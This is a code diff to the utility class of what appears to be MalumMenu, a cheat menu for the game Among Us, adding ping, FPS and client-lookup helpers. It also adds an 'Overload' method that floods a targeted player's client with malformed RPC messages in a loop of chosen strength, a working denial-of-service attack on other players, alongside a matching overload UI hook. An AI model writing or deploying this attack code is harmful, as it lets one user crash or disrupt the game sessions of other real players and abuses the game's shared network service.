@@ -23,6 +23,7 @@ public static class Utils
     public static ReferenceDataManager ReferenceDataManager = DestroyableSingleton<ReferenceDataManager>.Instance; // Useful for getting full lists of all the Among Us cosmetics IDs
     public static SabotageSystemType SabotageSystem => ShipStatus.Instance.Systems[SystemTypes.Sabotage].Cast<SabotageSystemType>();
     public static bool isShip => ShipStatus.Instance;
+    public static bool isClient => AmongUsClient.Instance;
     public static bool isLobby => AmongUsClient.Instance && AmongUsClient.Instance.GameState == InnerNetClient.GameStates.Joined && !isFreePlay;
     public static bool isOnlineGame => AmongUsClient.Instance && AmongUsClient.Instance.NetworkMode == NetworkModes.OnlineGame;
     public static bool isLocalGame => AmongUsClient.Instance && AmongUsClient.Instance.NetworkMode == NetworkModes.LocalGame;
@@ -66,28 +67,6 @@ public static class Utils
             PlayerControl.LocalPlayer.MyPhysics.Speed = Mathf.Abs(PlayerControl.LocalPlayer.MyPhysics.Speed - DefaultSpeed)
                                                         < snapRange ? DefaultSpeed : PlayerControl.LocalPlayer.MyPhysics.Speed;
         }
-    }
-
-    // Gets ClientData by PlayerControl
-    public static ClientData GetClientByPlayer(PlayerControl player)
-    {
-        try
-        {
-            var client = AmongUsClient.Instance.allClients.ToArray().FirstOrDefault(cd => cd.Character.PlayerId == player.PlayerId);
-            return client;
-        }
-        catch
-        {
-            return null;
-        }
-    }
-
-    // Gets ClientData.Id by PlayerControl
-    public static int GetClientIdByPlayer(PlayerControl player)
-    {
-        if (player == null) return -1;
-        var client = GetClientByPlayer(player);
-        return client == null ? -1 : client.Id;
     }
 
     // Gets a player's real name, display name, and whether they are disguised or not
@@ -282,6 +261,21 @@ public static class Utils
         }
     }
 
+    // Overloads targeted client with set strength using malformed RPCs
+    public static void Overload(int clientId, int strength)
+    {
+        bool hasLadders = isShip && (isFungleMap || isAirshipMap);
+
+        uint netId = hasLadders ? PlayerControl.LocalPlayer.NetId : PlayerControl.LocalPlayer.MyPhysics.NetId;
+        byte rpcCall = hasLadders ? (byte)RpcCalls.SetStartCounter : (byte)RpcCalls.ClimbLadder;
+
+        for (int i = 0; i < strength; i++)
+        {
+            MessageWriter overloadMsg = AmongUsClient.Instance.StartRpcImmediately(netId, rpcCall, SendOption.None, clientId);
+            AmongUsClient.Instance.FinishRpcImmediately(overloadMsg);
+        }
+    }
+
     // Closes Chat UI
     public static void CloseChat()
     {
@@ -363,14 +357,20 @@ public static class Utils
     }
 
     // Returns colored ping text for PingTracker
-    public static string GetColoredPingText(int ping)
+    public static string GetColoredPingText(string pingText, int ping)
     {
         return ping switch
         {
-            <= 100 => $"<color=#00ff00ff>PING: {ping} ms</color>", // Green for ping < 100
-            < 400 => $"<color=#ffff00ff>PING: {ping} ms</color>", // Yellow for 100 < ping < 400
-            _ => $"<color=#ff0000ff>PING: {ping} ms</color>" // Red for ping > 400
+            < 1 => $"<color=#b8b8b8>{pingText}</color>", // Grey for ping < 1
+            < 100 => $"<color=#00ff00ff>{pingText}</color>", // Green for ping < 100
+            < 400 => $"<color=#ffff00ff>{pingText}</color>", // Yellow for 100 < ping < 400
+            _ => $"<color=#ff0000ff>{pingText}</color>" // Red for ping > 400
         };
+    }
+
+    public static int GetFps()
+    {
+        return (int)(1f / Time.unscaledDeltaTime);
     }
 
     // Gets a UnityEngine.KeyCode from a string
@@ -528,12 +528,40 @@ public static class Utils
         return nameTag;
     }
 
+    public static NetworkedPlayerInfo GetPlayerDataFromClientId(int clientId)
+    {
+        var players = PlayerControl.AllPlayerControls.ToArray();
+
+        for (int i = 0; i < players.Count; i++)
+		{   NetworkedPlayerInfo playerData = players[i].Data;
+
+			if (playerData.ClientId == clientId)
+			{
+				return playerData;
+			}
+		}
+
+        return null;
+    }
+
     public static string GetRandomName()
     {
         // Randomizes 1-12 characters long names
         var length = UnityEngine.Random.Range(1, 13);
         const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         return new string(Enumerable.Repeat(chars, length).Select(s => s[UnityEngine.Random.Range(0, s.Length)]).ToArray());
+    }
+
+    public static int GetPing()
+    {
+        if (isClient && AmongUsClient.Instance.AmClient)
+        {
+            return AmongUsClient.Instance.Ping;
+        }
+        else
+        {
+            return 0;
+        }
     }
 
     // Shows a custom popup ingame
@@ -674,6 +702,7 @@ public static class Utils
         UnityEngine.Object.Destroy(MalumMenu.menuUI);
 
         UnityEngine.Object.Destroy(MalumMenu.consoleUI);
+        UnityEngine.Object.Destroy(MalumMenu.overloadUI);
         UnityEngine.Object.Destroy(MalumMenu.rolesUI);
         UnityEngine.Object.Destroy(MalumMenu.doorsUI);
         UnityEngine.Object.Destroy(MalumMenu.tasksUI);
